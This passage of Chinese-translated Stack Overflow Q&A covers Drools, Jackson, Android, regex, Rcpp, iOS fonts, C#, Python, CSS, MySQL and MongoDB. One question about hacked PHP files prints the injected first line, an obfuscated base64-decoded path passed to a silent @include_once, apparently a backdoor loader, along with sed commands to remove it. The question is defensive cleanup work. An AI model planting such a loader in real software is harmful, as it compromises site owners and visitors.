$b : Item(valueType == "Payments", value.rates.discounts.percent == 1337)
$c : Item(valueType == "Royalty", value.student.occupation == "Librarian") 
```

...等等。现在，我面临的问题是 Drools 在加载规则时静态类型检查规则，不允许这种使用，因为不能保证拥有所有者/费率/学生字段等等。

有没有办法做到这一点，可能是某种类型转换或绕过类型检查？

（注意：不幸的是，目前还不能选择更改要键入的模型，而不是将所有内容都放入对象中。）

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-13T13:02:41.587

从 Drools 5.5.0 开始，您可以“投射”事实的属性。请阅读本文档的第 4.1.1.2 节：http: [//docs.jboss.org/drools/release/5.5.0.Final/droolsjbpm-introduction-docs/html_single/](http://docs.jboss.org/drools/release/5.5.0.Final/droolsjbpm-introduction-docs/html_single/)

基本上，您需要做的是：

```
$a : Item(valueType == "Car", value#Car.owner.location == "At Home") 
```

**免责声明：我以前从未尝试过。**

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-13T21:10:33.457

您也可以在类型声明中使用 @typesafe(false) ，但是如另一个答案所示的强制转换要好得多。

# linux - 用正则表达式删除 sed 的第一行

> ID：14853321
> 
> 赞同：0
> 
> 时间：2013-02-13T12:13:00.360
> 
> 标签：linux, sed, grep

我想删除与下一个 grep 命令匹配的所有文件中的第一行：

```
grep -Rl '<\?php /\* <!-----.*/\?>' ./ 
```

这些文件被黑了，我想删除这一行。我尝试了几个带有“sed”的命令，但没有结果，命令如下：

```
sed 's/<\?php /\* <!-----.*/\?>//g' ./* 
```

谢谢，最好的问候。

编辑。例子：

```
<?php /* <!-----sSMiRuomIZgafwAFrWqzLk-----> */ $SVjFIagfCmbDNLrO = base64_decode("L2hvbWUvZmVybmFuNi9wdWJsaWNfaHRtbC9QSFBMaXN0L2FkbWluL0ZDS2VkaXRvci9lZGl0b3IvZGlhbG9nL2Zja19zcGVsbGVycGFnZXMvc3BlbGxlcnBhZ2VzL3NlcnZlci1zY3JpcHRzLzIzMWE5ZDFhMGVmODM1NTEwNjdhMTY1YmU3ZmI4M2Zka2l4b3JscXZ1YiawaHX=");  @include_once $SVjFIagfCmbDNLrO;/* <!-----sSMiRuomIZgafwAFrWqzLk-----> */?><?php
defined('_JEXEC') or die('Direct Access to this location is not allowed.');

/** 
```

并且只需要从`<?php /*....`to中删除`*/?>`

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-13T12:16:50.987

你想要的是：

```
sed -i.ORIG '1 { /YOUR_REGEX_PATTERN/d ; }' INPUTFILES* 
```

`.ORIG`这仅在第一行运行，如果它与您的模式匹配，则将其删除（原地，并使用扩展名备份原始文件）。

*更新：*

如果您只想删除第一行的某些部分：

```
sed -i.ORIG '1 { /YOUR_REGEX_PATTERN/s/YOUR_REGEX_PATTERN// ; }' INPUTFILES* 
```

在您的情况下，它可能是：

```
sed -i.ORIG '1 { /<?php \/\*.*\/?>/s_<?php /\*.*<?php_<?php_ ; }' INPUTFILES* 
```

但这仅在某些情况下有效……例如，`<?php`可能出现在编码字符串部分中……（可能发生……）。并且 sed 不支持非贪婪和/或前瞻、后瞻正则表达式......

# android - 找不到非具体集合类型的反序列化

> ID：14853324
> 
> 赞同：1
> 
> 时间：2013-02-13T12:13:17.853
> 
> 标签：android, json, jackson, ormlite

我正在使用杰克逊库将 JSON 映射到对象中。我已经简化*了很多*问题，这就是发生的事情：

```
public class MyObject{

    public ForeignCollection<MySecondObject> getA(){
        return null;
    }

    public ForeignCollection<MyThirdObject> getB(){
        return null;
    }
} 
```

我正在解析一个空的 JSON 字符串：

```
ObjectMapper mapper = new ObjectMapper();
mapper.readValue("{}", MyObject.class); 
```

上`readValue`，我得到这个异常：

```
com.fasterxml.jackson.databind.JsonMappingException: Can not find a deserializer for non-concrete Collection type [collection type; class com.j256.ormlite.dao.ForeignCollection, contains [simple type, class com.test.MyThirdObject]] 
```

当我在类中有*两个* 返回 a 的`get`方法时会发生这种情况。删除其中一种方法不会导致异常。`MyObject``ForeignCollection``get`

实际上，我对映射器查看`get`方法的事实感到惊讶，它应该只设置我指示的字段。

这里发生了什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2018-03-20T19:51:33.897

您需要在 ObjectMapper 中使用 Guava 模块。这是 Maven 依赖项：

```
<dependency>
  <groupId>com.fasterxml.jackson.datatype</groupId>
  <artifactId>jackson-datatype-guava</artifactId>
  <version>{whatever is the latest}</version>
</dependency> 
```

在您的代码中：

```
ObjectMapper mapper = new ObjectMapper();
// register module with object mapper
mapper.registerModule(new GuavaModule()); 
```

您可以省略`@JsonDeserialize`和`@JsonSerialize`注释。

更多信息[在这里](http://immutables.github.io/json.html#jackson-guava)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-17T12:08:31.103

我已通过将其转换`ForeignCollection`为 a 来解决此问题`List`：

```
private ForeignCollection<MyObject> myObjects;

public List<MyObject> getMyObjects(){
    return new ArrayList<MyObject>(myObjects);
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-14T05:54:48.853

您可能需要为`ForeignCollection`;定义自定义反序列化器。或者，如果有已知的实现类，使用注解：

```
@JsonDeserialize(as=ForeignCollectionImpl.class) 
```

指示要用于该抽象类型的具体子类。

# android - 如何在android中关闭AlertDialog

> ID：14853325
> 
> 赞同：49
> 
> 时间：2013-02-13T12:13:19.900
> 
> 标签：android, android-alertdialog, dismiss

我创建了包含 4 个按钮的 AlertDialog

```
OptionDialog = new AlertDialog.Builder(this);
        OptionDialog.setTitle("Options");
        LayoutInflater li = (LayoutInflater) this.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
        View v = li.inflate(R.layout.options, null, false);
        background = (Button) v.findViewById(R.id.bkgSpinnerLabel);
        SoundVib = (Button) v.findViewById(R.id.SoundVibSpinnerLabel);

        OptionDialog.setView(v);
        OptionDialog.setCancelable(true);
        OptionDialog.setNeutralButton("Ok",
                new DialogInterface.OnClickListener() {

                    public void onClick(DialogInterface arg0, int arg1) {
                    }
                });
        background.setOnClickListener(new OnClickListener() {
            public void onClick(View v) {
                SetBackground();
             // here I want to dismiss it after SetBackground() method 
            }
        });

        SoundVib.setOnClickListener(new OnClickListener() {
            public void onClick(View v) {
                Intent soundVibIntent = new Intent(SebhaActivity.this, EditPreferences.class);
                startActivity(soundVibIntent);
            }
        });

        OptionDialog.show(); 
```

我想在 SetBackground() 方法之后关闭它，我该怎么做？提前致谢。

* * *

## 回答 #1

> 赞同：143
> 
> 时间：2013-02-13T12:16:45.687

实际上，AlertDialog.Builder 类中没有任何方法`cancel()`或`dismiss()`方法。

所以而不是`AlertDialog.Builder optionDialog`使用`AlertDialog`实例。

像，

```
AlertDialog optionDialog = new AlertDialog.Builder(this).create(); 
```

现在，只需打电话 `optionDialog.dismiss();`

```
background.setOnClickListener(new OnClickListener() {
    public void onClick(View v) {
        SetBackground();
        // here I want to dismiss it after SetBackground() method 
        optionDialog.dismiss();
    }
}); 
```

* * *

## 回答 #2

> 赞同：64
> 
> 时间：2014-02-27T04:43:08.130

我认为有一个更简单的解决方案：只需使用`DialogInterface`传递给`onClick`方法的参数即可。

```
AlertDialog.Builder db = new AlertDialog.Builder(context);
        db.setNegativeButton("cancel", new DialogInterface.OnClickListener(){
            @Override
            public void onClick(DialogInterface d, int arg1) {
                db.cancel();
                //here db.cancel will dismiss the builder

            };  
        }); 
```

例如，参见[http://www.mkyong.com/android/android-alert-dialog-example](http://www.mkyong.com/android/android-alert-dialog-example)。

* * *

## 回答 #3

> 赞同：11
> 
> 时间：2013-02-13T12:19:36.253

试试这个：

```
 AlertDialog.Builder builder = new AlertDialog.Builder(this);
   AlertDialog OptionDialog = builder.create();
  background.setOnClickListener(new OnClickListener() {
        public void onClick(View v) {
            SetBackground();
       OptionDialog .dismiss();
        }
    }); 
```

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2017-10-30T23:40:20.290

关闭或取消 AlertDialog.Builder

```
dialog.setNegativeButton("إلغاء", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialogInterface, int i) {
                        dialogInterface.dismiss();
                    }
                }); 
```

你在对话框界面上调用dismiss()

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2017-02-06T18:43:50.103

这是我关闭警报对话框的方法

```
lv_three.setOnItemLongClickListener(new AdapterView.OnItemLongClickListener() {
            @Override
            public boolean onItemLongClick(AdapterView<?> parent, View view, int position, long id) {
                GetTalebeDataUser clickedObj = (GetTalebeDataUser) parent.getItemAtPosition(position);
                alertDialog.setTitle(clickedObj.getAd());
                alertDialog.setMessage("Öğrenci Bilgileri Güncelle?");
                alertDialog.setIcon(R.drawable.ic_info);
                // Setting Positive "Yes" Button
                alertDialog.setPositiveButton("Tamam", new DialogInterface.OnClickListener() {
                    public void onClick(DialogInterface dialog, int which) {
                        // User pressed YES button. Write Logic Here
                    }
                });
                alertDialog.setNegativeButton("İptal", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialogInterface, int i) {
                        //alertDialog.
                        alertDialog.setCancelable(true); // HERE

                    }
                });
                alertDialog.show();
                return true;
            }
        }); 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2016-09-07T05:21:59.543

有两种方法可以关闭警报对话框。

选项1：

`AlertDialog#create().dismiss();`

选项 2：

`The DialogInterface#dismiss();`

开箱即用，`DialogInterface#dismiss();`当您为按钮定义事件侦听器时，框架会调用：

1.  `AlertDialog#setNegativeButton();`
2.  `AlertDialog#setPositiveButton();`
3.  `AlertDialog#setNeutralButton();`

用于警报对话框。

* * *

## 回答 #7

> 赞同：-2
> 
> 时间：2017-06-16T11:04:52.910

只需将视图设置为 null 即可简单地关闭 AlertDialog。

# android - 如果提供了清除顶部和单顶部标志，则在终止活动后无法正确恢复意图

> ID：14853327
> 
> 赞同：10
> 
> 时间：2013-02-13T12:13:25.657
> 
> 标签：android, android-intent

在我的应用程序中，有一个使用[FLAG_ACTIVITY_SINGLE_TOP](https://developer.android.com/reference/android/content/Intent.html#FLAG_ACTIVITY_SINGLE_TOP)和[FLAG_ACTIVITY_CLEAR_TOP](https://developer.android.com/reference/android/content/Intent.html#FLAG_ACTIVITY_CLEAR_TOP)标志启动的活动，因为我想确保该活动的只有一个实例位于堆栈顶部，并且旧实例顶部的所有活动都已关闭。到目前为止，一切都很好。

接下来我想测试活动是否在多次创建并连续销毁后正确恢复。我注意使用[`Activity.setIntent()`](https://developer.android.com/reference/android/app/Activity.html#setIntent%28android.content.Intent%29)when手动设置意图，[`Activity.onNewIntent()`](https://developer.android.com/reference/android/app/Activity.html#onNewIntent%28android.content.Intent%29)以便返回最新的意图[`Activity.getIntent()`](https://developer.android.com/reference/android/app/Activity.html#getIntent%28%29)。为了测试我在开发人员选项中激活了“不保留活动”选项，但是[`Activity.getIntent()`](https://developer.android.com/reference/android/app/Activity.html#getIntent%28%29)重新创建活动时返回的意图是创建它的第一个意图，而不是最近的意图。

这发生在 JB 和 ICS 上，我没有在旧版本上测试过。我做错了什么还是我误解了文档中的某些内容？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2013-02-13T12:38:49.427

如果你在前台杀死你的应用程序，这与 Android 杀死你的应用程序不同（只有当你的应用程序在后台时才会这样做）。如果您杀死然后重新启动应用程序，就像从头开始重新启动它一样。这里没有“恢复”。如果您添加日志记录，`onCreate()`您应该会看到在您杀死并重新启动您的应用程序后，`Bundle`传递给`onCreate()`的值为空。

不幸的是，很难模拟当 Android 杀死你的应用程序时会发生什么。

**编辑：在 OP 评论后添加了更多内容**

这是一个用于讨论目的的具体示例。首先**没有**开发人员选项“不保留活动”：

*   `ActivityA`是根活动
*   我们开始`ActivityA`
*   `ActivityA.onCreate()`叫做
*   `ActivityA`现在开始`ActivityB`
*   `ActivityB.onCreate()`被调用（活动堆栈现在包含`ActivityA`-> `ActivityB`）
*   `ActivityB`以一个额外的“foo”`ActivityA`开头`FLAG_ACTIVITY_CLEAR_TOP | FLAG_ACTIVITY_SINGLE_TOP`
*   `ActivityA.onNewIntent()`被`Intent`包含`FLAG_ACTIVITY_CLEAR_TOP | FLAG_ACTIVITY_SINGLE_TOP`和额外的“foo”调用
*   `ActivityB.onDestroy()`由于活动堆栈被清除回`ActivityA`

现在，让我们做同样的事情，但启用开发人员选项“不保留活动”（我用**粗体**突出显示与前一个场景不同的东西）：

*   `ActivityA`是根活动
*   我们开始`ActivityA`
*   `ActivityA.onCreate()`叫做
*   `ActivityA`现在开始`ActivityB`
*   `ActivityB.onCreate()`被调用（活动堆栈现在包含`ActivityA`-> `ActivityB`）
*   **因为`ActivityA`已经停止，Android销毁它并调用`ActivityA.onDestroy()`**
*   **注意：活动堆栈仍然包含`ActivityA`-> `ActivityB`，即使目前没有 的实例`ActivityA`。Android 记住所有状态**
*   `ActivityB`以一个额外的“foo”`ActivityA`开头`FLAG_ACTIVITY_CLEAR_TOP | FLAG_ACTIVITY_SINGLE_TOP`
*   **由于 Android 没有`ActivityA`要重新激活的实例，因此它需要创建一个，所以它会创建一个，然后......**
*   **`ActivityA.onCreate()``Intent`调用的方式与创建原始实例时调用的方式相同`ActivityA`（即：LAUNCH 意图，没有标志和额外内容）**
*   `ActivityA.onNewIntent()`被`Intent`包含`FLAG_ACTIVITY_CLEAR_TOP | FLAG_ACTIVITY_SINGLE_TOP`和额外的“foo”调用
*   `ActivityB.onDestroy()`由于活动堆栈被清除回`ActivityA`

这里要注意的重要一点是，Android 总是`onCreate()`在创建活动实例时调用。把它想象**成**一个`Activity`. 如果由于进程被杀死或活动被破坏，Android 必须重新创建一个实例`Activity`，那么它将实例化一个新对象，然后调用`onCreate()`，然后（如果需要）它会调用`onNewIntent()`.

当您调用`setIntent()`它时，它实际上并没有改变`Intent`Android 保存和恢复的内容。这只会更改`Intent`将从调用返回的内存中的`getIntent()`.

我希望这现在更清楚了。如果没有，请告诉我。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-08-19T06:09:19.337

不确定您是否找到了解决方案，但是覆盖目标活动的 onNewIntent(Intent theNewIntent) 方法并调用 setIntent(theNewIntent) 为我解决了这个问题。

```
@Override
protected void onNewIntent(Intent intent) {
    super.onNewIntent(intent);

    /*
     * This overrides the original intent.
     */      
    setIntent(intent);
} 
```

# java - 正则表达式模式匹配 条件变量名？

> ID：14853330
> 
> 赞同：2
> 
> 时间：2013-02-13T12:13:34.260
> 
> 标签：java, regex, jsp

我需要获取特定jsp中所有情况的条件变量名称我正在逐行读取jsp并搜索特定模式，例如一行说它检查找到匹配项的两种类型的cond

```
 <c:if condition="Event ='Confirmation'">
       <c:if condition="Event1 = 'Confirmation' or Event2 = 'Action'or Event3 = 'Check'" .....> 
```

**期望的结果**是所有 cond 变量的名称 - **Event,Event1,Event2,Event3**我写了一个解析器，它只满足第一种情况但无法找到第二种情况的变量名。需要一个模式来满足它们。

```
 String stringSearch = "<c:if";
    while ((line = bf.readLine()) != null) {
                // Increment the count and find the index of the word
                lineCount++;
                int indexfound = line.indexOf(stringSearch);

                if (indexfound > -1) {

                    Pattern pattern = Pattern
                            .compile(test=\"([\\!\\(]*)(.*?)([\\=\\)\\s\\.\\>\\[\\(]+?));

                    Matcher matcher = pattern.matcher(line);
                    if (matcher.find()) {

                        str = matcher.group(1);
                        hset.add(str);
                        counter++;

                    }
                } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T13:19:55.233

如果我很好地理解了您的要求，这可能会起作用：

```
("|\s+)!?(\w+?)\s*=\s*'.*?' 
```

`$2`将给每个条件变量名称。

它的作用是：

`("|\s+)`一个**"**或**一个或多个空格**

`!?`一个可选的**！**

`(\w+?)`一个或多个单词字符（字母、数字或下划线）（`([A-Za-z]\w*)`会更正确）

`\s*=\s*`an **=**前后有零个或多个空格

`'.*?'`**'**和**'**中的零个或多个字符

 **第二个捕获组是 (\w+?) 检索变量名称

添加所需的转义`\`

**编辑：**对于您指定的附加条件，以下可能就足够了：

```
("|or\s+|and\s+)!?(\w+?)(\[\d+\]|\..*?)?\s*(!?=|>=?|<=?)\s*.*? 
```

`("|or\s+|and\s+)`一个**"**或 an**或**后接一个或多个空格或 an **and**后接一个或多个空格。（这里假设每个表达式部分或变量名前接一个**"**或 an**或**后接一个或多个空格或一个后跟一个或多个空格**）**

`!?(\w+?)`一个可选的**！**后跟一个或多个单词字符

`(\[\d+\]|\..*?)?`可选部分，由**方括号中的数字**组成，或**由点后跟零个或多个字符组成**

`(!?=|>=?|<=?)`以下任何关系运算符：=,!=,>,<,>=,<=

`$2`将给出变量名称。

这里第二个捕获组正在`(\w+?)`检索变量名称，第三个捕获组检索任何存在的后缀（例如：`[2]`in `Event[2]`）。

对于包含条件的输入`Event.indexOf(2)=something`，仅`$2`给出`Event`。如果你想让它被`Event.indexOf(2)`使用`$2$3`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-14T08:40:13.610

这可以满足您的需求：

```
"(\\w+)\\s*=\\s*(?!\")" 
```

意思是：

```
Every word followed by a = that isn't followed by a " 
```

例如：

```
String s = "<c:if condition=\"Event ='Confirmation'\"><c:if condition=\"Event1 = 'Confirmation' or Event2 = 'Action'or Event3 = 'Check'\" .....>";
Pattern p = Pattern.compile("(\\w+)\\s*=\\s*(?!\")");
Matcher m = p.matcher(s);
while (m.find()) {
    System.out.println(m.group(1));
} 
```

印刷：

```
Event
Event1
Event2
Event3 
```**

# r - 在 Rcpp 中对随机整数进行采样

> ID：14853334
> 
> 赞同：8
> 
> 时间：2013-02-13T12:13:44.297
> 
> 标签：r, rcpp

这可能是一个非常简单的问题，但我真的找不到。如何在 Rcpp 中对 1 和 N 之间的随机整数进行采样？我知道我可以采样一个统一的数字并对其进行四舍五入，或者包含`sample`要在 C++ 代码中使用的函数，但两者似乎都不是正确的做法。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-02-13T14:11:12.613

1.  AFIACR 我们在 Rcpp-land 中没有“体面”（即矢量化）`sample()`功能，但 Christian Gunning 正在通过 RcppArmadillo 开发基于犰狳的功能。

2.  您当然可以从 U(0,1) 采样，缩放到 N 和其余部分。我们有`R::runif()`标量情况和`runif()`矢量化的糖。

*编辑：*截至 2017 年，RcppArmadillo 和 Rcpp 现在都有一个`sample()`功能。

# ios - “Cocoa Touch 静态库”中的自定义字体

> ID：14853335
> 
> 赞同：2
> 
> 时间：2013-02-13T12:13:44.467
> 
> 标签：ios, objective-c, cocoa-touch, static-libraries, custom-font

我正在创建一个供其他 iOS 开发人员使用的框架（“Cocoa Touch Static Library”）。现在我将按照[此处](http://kgriff.posterous.com/45359635)的步骤在我的框架内使用自定义字体。步骤 2 在 Info.plist 文件中设置“UIAppFonts”。但在框架的情况下，Info.plist 将由开发人员提供，即）。所以我的框架用户只能在他们的应用程序的 plist 文件中设置“UIAppFonts”属性，或者有没有办法自己在框架内设置属性，这样我框架的每个用户都不需要设置“UIAppFonts”属性？请指教，谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2014-02-23T23:28:30.867

正如您所说，您不能从静态库中设置 UIAppFonts 。根据您要使用它的目的，您可能不需要它。

作为一种解决方法，您可以在应用程序生命周期的任何时候动态加载字体，例如在静态库中一些早期调用的 init/setup 方法期间。

请参阅Marco Arment 的[本教程，代码如下：](http://www.marco.org/2012/12/21/ios-dynamic-font-loading)

```
NSData *inData = /* your decrypted font-file data */;
CFErrorRef error;
CGDataProviderRef provider = CGDataProviderCreateWithCFData((CFDataRef)inData);
CGFontRef font = CGFontCreateWithDataProvider(provider);
if (! CTFontManagerRegisterGraphicsFont(font, &error)) {
    CFStringRef errorDescription = CFErrorCopyDescription(error)
    NSLog(@"Failed to load font: %@", errorDescription);
    CFRelease(errorDescription);
}
CFRelease(font);
CFRelease(provider); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T12:18:18.930

您可以提供一个示例 plist，甚至可以编写一个实用程序，通过更新给定的属性列表来执行此设置，但是库的用户需要自己做一些事情，要么手动更新 plist，要么使用您的实用程序。你无法避免这一点。

# c# - 摆脱字典中的空格

> ID：14853337
> 
> 赞同：-3
> 
> 时间：2013-02-13T12:13:48.400
> 
> 标签：c#, idictionary

我有一本字典

```
Dictionary<string, List<string>> dictGenSubs = new Dictionary<string, List<string>>(); 
```

如何确保字典的任何记录中都没有空格？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T12:16:27.443

我假设您只是在谈论列表中的字符串。

要实现该目标，您可以使用以下代码：

```
dictGenSubs = dictGenSubs.ToDictionary(
                  x => x.Key,
                  x => x.Value
                        .Select(x => x.Replace(" ", string.Empty))
                        .ToList()); 
```

这将创建一个新字典，其中包含新列表作为字典的值。每个列表中的每个字符串都将在添加到新列表之前进行调整。

更有效的方法是更新现有字典和现有列表：

```
foreach(var list in dictGenSubs.Values)
{
    for(int i = 0; i < list.Count; ++i)
        list[i] = list[i].Replace(" ", string.Empty);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T12:22:58.617

您是指每个值的任何字符串中的任何空格吗？这是使用 LINQ 的一种简洁低效的方法：

```
bool hasWhitespace = dictGenSubs.SelectMany(kv => kv.Value)
       .Any(s => s.Any(char.IsWhiteSpace)); 
```

# python - 拆分list的python列表

> ID：14853348
> 
> 赞同：1
> 
> 时间：2013-02-13T12:14:25.707
> 
> 标签：python, list

您好，我是 python 新手，我有一个列表列表，

```
data = [['shop_id', '=', 1],
        ['product_id', '=', 16], ['product_id', '=', 8], ['product_id', '=', 4], ['product_id', '=', 6],
        ['so', '=', 1],['so', '=', 2],
        ['state', '=', u'draft']
       ] 
```

我想要一个像这样的输出，

```
out_put = [[['shop_id', '=', 1]],
           [['shop_id', '=', 1],['product_id', '=', 16]],
           [['shop_id', '=', 1],['product_id', '=', 8]],
           [['shop_id', '=', 1],['product_id', '=', 4]],
           [['shop_id', '=', 1],['product_id', '=', 6]],
           [['shop_id', '=', 1],['product_id', '=', 16],['so', '=', 1]],
           [['shop_id', '=', 1],['product_id', '=', 8],['so', '=', 1]],
           [['shop_id', '=', 1],['product_id', '=', 4],['so', '=', 1]],
           [['shop_id', '=', 1],['product_id', '=', 6],['so', '=', 1]],
           [['shop_id', '=', 1],['product_id', '=', 16],['so', '=', 2]],
           [['shop_id', '=', 1],['product_id', '=', 8],['so', '=', 2]],
           [['shop_id', '=', 1],['product_id', '=', 4],['so', '=', 2]],
           [['shop_id', '=', 1],['product_id', '=', 6],['so', '=', 2]],
           [['shop_id', '=', 1],['product_id', '=', 16],['so', '=', 1],['state', '=', u'draft']],
           [['shop_id', '=', 1],['product_id', '=', 8],['so', '=', 1],['state', '=', u'draft']],
           [['shop_id', '=', 1],['product_id', '=', 4],['so', '=', 1],['state', '=', u'draft']],
           [['shop_id', '=', 1],['product_id', '=', 6],['so', '=', 1],['state', '=', u'draft']],
           [['shop_id', '=', 1],['product_id', '=', 16],['so', '=', 2],['state', '=', u'draft']],
           [['shop_id', '=', 1],['product_id', '=', 8],['so', '=', 2],['state', '=', u'draft']],
           [['shop_id', '=', 1],['product_id', '=', 4],['so', '=', 2],['state', '=', u'draft']],
           [['shop_id', '=', 1],['product_id', '=', 6],['so', '=', 2],['state', '=', u'draft']],
           ] 
```

我尝试了几种方法，但找不到解决方案。like

```
for domain in data:
    if domain[0] not in temp:
        final_dom.append(domain)
        print "final_dom :::",final_dom
        temp.append(domain[0])
    else:
        print "adsada"
        final_dom.pop()
        final_dom.append(domain)
        print "final_dom :::",final_dom 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T12:48:21.127

```
from itertools import groupby, product
from operator import itemgetter

groups = [list(g) for _,g in groupby(data,key=itemgetter(0))]
for i in range(1,len(groups)+1):
    print list(product(*groups[:i])) 
```

出去：

```
[(['shop_id', '=', 1],)]
[(['shop_id', '=', 1], ['product_id', '=', 16]),
 (['shop_id', '=', 1], ['product_id', '=', 8]), 
 (['shop_id', '=', 1], ['product_id', '=', 4]), 
 (['shop_id', '=', 1], ['product_id', '=', 6])]
[(['shop_id', '=', 1], ['product_id', '=', 16], ['so', '=', 1]), 
 (['shop_id', '=', 1], ['product_id', '=', 16], ['so', '=', 2]),
 (['shop_id', '=', 1], ['product_id', '=', 8], ['so', '=', 1]), 
 (['shop_id', '=', 1], ['product_id', '=', 8], ['so', '=', 2]), 
 (['shop_id', '=', 1], ['product_id', '=', 4], ['so', '=', 1]), 
 (['shop_id', '=', 1], ['product_id', '=', 4], ['so', '=', 2]),
 (['shop_id', '=', 1], ['product_id', '=', 6], ['so', '=', 1]),
 (['shop_id', '=', 1], ['product_id', '=', 6], ['so', '=', 2])]
[(['shop_id', '=', 1], ['product_id', '=', 16], ['so', '=', 1], ['state', '=', u'draft']),
 (['shop_id', '=', 1], ['product_id', '=', 16], ['so', '=', 2], ['state', '=', u'draft']), 
 (['shop_id', '=', 1], ['product_id', '=', 8], ['so', '=', 1], ['state', '=', u'draft']), 
 (['shop_id', '=', 1], ['product_id', '=', 8], ['so', '=', 2], ['state', '=', u'draft']), 
 (['shop_id', '=', 1], ['product_id', '=', 4], ['so', '=', 1], ['state', '=', u'draft']), 
 (['shop_id', '=', 1], ['product_id', '=', 4], ['so', '=', 2], ['state', '=', u'draft']),
 (['shop_id', '=', 1], ['product_id', '=', 6], ['so', '=', 1], ['state', '=', u'draft']),
 (['shop_id', '=', 1], ['product_id', '=', 6], ['so', '=', 2], ['state', '=', u'draft'])] 
```

# html - 使用 CSS 垂直布局而不使用破坏元素？

> ID：14853352
> 
> 赞同：13
> 
> 时间：2013-02-13T12:14:46.790
> 
> 标签：html, css, layout, positioning, vertical-alignment

是否可以仅使用**CSS**而不是使用 HTML 元素来实现**垂直布局？**

 **我在一个 div 中有一个 div 列表。默认下一个元素是从右到最后，当右边没有位置时，它放在下面。

我想用 CSS 样式设置来实现同样的效果。是否可以？

CSS-only 我的意思是，我们有 div 和它的孩子，并且**不**添加任何特殊的东西，例如：

*   换行元素 ( `<br/>, <div style="clear:both;"/>`)
*   UL 标签
*   表（是的，仍在使用，fg JSF 几乎完全基于它们）

所以：

```
<div id="menu">
  <a href="something1">Page 1</a>
  <a href="something2">Page 2</a>
  <a href="something3">Page 3</a>
</div> 
```

和 CSS 实现垂直布局：

```
#menu { ??? }
#menu a { ??? } 
```

有没有 ？？？我可以用它来实现我想要的吗？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2013-02-13T12:17:04.757

将锚标记显示为块元素。

```
#menu a {
display: block;
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-13T12:17:42.013

你的意思是这样的吗？

[http://jsfiddle.net/7Y9jS/](http://jsfiddle.net/7Y9jS/)

```
#menu {
    width: 300px;
}

#menu a {
    display: block;
    background: #ccc;
    color: #000;
    padding: 10px 0;
    text-align: center;
    margin-bottom: 2px;
}

<div id="menu">
  <a href="something1">Page 1</a>
  <a href="something2">Page 2</a>
  <a href="something3">Page 3</a>
</div> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-13T12:20:24.793

将显示块设置为

```
#menu a {
    display: block;
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-02-13T12:22:37.577

使用左浮动

```
#menu a {
    float:left;
} 
```

然后将班级组添加到您的#menu

```
.group:before,
.group:after {
    content: "";
    display: table;
} 
.group:after {
    clear: both;
}
.group {
    zoom: 1; /* For IE 6/7 (trigger hasLayout) */
} 
```**

# mysql - 为导出/导入加扰 MySql 单元格内容

> ID：14853353
> 
> 赞同：1
> 
> 时间：2013-02-13T12:15:08.863
> 
> 标签：mysql, mysqldump

有一个生产系统，其中包含托管在 MySQL 数据库上的敏感数据。我想在不修改原始内容的情况下按原样导出这些数据，但出于安全原因，*副本*中的某些列被打乱或替换为随机生成的内容，因为它将被移动到相对不安全的环境（例如姓名、地址） . 然后将这些数据导入开发环境进行性能测试等。

是否有任何方便的工具可以让我导出/导入工具，同时混淆/加扰包含敏感数据的列？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T12:27:38.450

好问题。我认为您的任务没有现成的解决方案。

我会在转储的文本文件上进行编程，或者如果您需要进行更多更改并且经常这样做，您可以编写一个从生产系统读取的脚本，对值进行打乱并将它们直接存储到您的测试环境中。

# c# - MongoDB：仅更新特定字段

> ID：14853362
> 
> 赞同：13
> 
> 时间：2013-02-13T12:15:42.627
> 
> 标签：c#, mongodb, mongodb-.net-driver

我正在尝试使用 C# 驱动程序更新（类型化的）MongoDB 集合中的一行。在处理特定类型集合的数据时`MongoCollection<User>`，我倾向于避免从集合中检索敏感数据（盐、密码哈希等）

现在我正在尝试更新一个`User`实例。但是，我从来没有真正检索过敏感数据，所以我猜在我应用修改并将新数据提交到集合之前，这些数据将`default(byte[])`在检索到的模型实例中（据我所知）。

也许我正在监督 MongoDB C# 驱动程序中的一些琐碎事情，我如何在`MongoCollection<T>.Save(T item)`不更新特定属性的情况下使用`User.PasswordHash`或`User.PasswordSalt`？我应该先检索完整记录，更新那里的“安全”属性，然后再写回去吗？或者是否有从更新中排除某些字段的奇特选项？

提前致谢

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2013-02-16T04:56:12.703

Save(someValue) 适用于您希望结果记录成为或成为您传入的完整对象 (someValue) 的情况。

您可以使用

```
var query = Query.EQ("_id","123");
var sortBy = SortBy.Null;
var update = Update.Inc("LoginCount",1).Set("LastLogin",DateTime.UtcNow); // some update, you can chain a series of update commands here

MongoCollection<User>.FindAndModify(query,sortby,update); 
```

方法。

使用 FindAndModify，您可以准确指定现有记录中要更改的字段，而不必理会其余字段。

[你可以在这里](http://docs.mongodb.org/ecosystem/tutorial/use-csharp-driver/#findandmodify-method)看到一个例子。

